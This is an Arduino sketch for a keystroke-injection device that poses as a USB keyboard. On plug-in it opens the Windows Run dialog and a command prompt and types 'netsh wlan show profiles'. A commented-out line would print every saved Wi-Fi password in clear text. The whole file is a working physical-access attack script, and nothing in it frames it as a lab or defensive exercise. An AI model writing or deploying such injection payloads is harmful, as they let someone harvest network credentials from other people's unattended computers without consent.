#include <Keyboard.h>
void setup() {
  Keyboard.begin();
  delay(2000);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(50);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.print("netsh wlan show profiles");
  //Keyboard.print("for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo%j | findstr -i -v echo | netsh wlan show profiles %j key=clear");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();

}

void loop() {
  // put your main code here, to run repeatedly:

}
